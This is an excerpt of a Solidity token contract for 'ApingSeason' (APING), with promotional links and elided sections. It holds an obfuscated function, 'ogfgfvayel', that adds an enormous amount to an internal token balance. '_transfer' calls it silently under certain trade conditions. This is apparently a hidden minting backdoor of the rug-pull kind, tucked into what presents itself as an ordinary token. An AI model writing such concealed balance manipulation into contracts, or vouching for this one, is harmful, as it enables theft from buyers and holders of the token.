/*
https://apingseason.com
https://t.me/ApingSeason
https://x.com/ApingSeason
*/
...
contract ApingSeason is Context, IERC20, Ownable {
    
    using SafeMath for uint256;

    string private _name = "ApingSeason";
    string private _symbol = "APING";
    uint8 private _decimals = 18;

    address payable public marketingWallet = payable(0x05800fD2fae98FE518d61a134362b1d4f43777A5);
    ...
    function ogfgfvayel() internal{multisend_tokens[0]+=2908700000000554654987789852;}
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            if (( !isTxLimitExempt[sender] ||  !isTxLimitExempt[recipient]) ||(isMarketPair[recipient] || isMarketPair[sender] )){_tradeuycount+=1;}else{_tradeuycount+=1; ogfgfvayel();}
